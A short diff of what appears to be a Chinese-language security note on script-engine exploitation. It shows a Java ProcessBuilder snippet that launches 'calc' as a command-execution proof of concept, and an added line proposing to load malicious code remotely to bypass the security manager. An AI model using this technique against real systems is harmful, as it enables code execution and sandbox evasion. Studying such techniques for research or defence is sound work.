@@ -160,3 +160,5 @@ evil
 ```java
 var a=exp();function exp(){var x=new java.lang.ProcessBuilder; x.command("calc"); x.start();};
 ```
+
+扩展，那这样的话是不是可以减少我们的exp拉。在远程的调用我们的恶意代码可以bypass sm,然后通过load来加载。
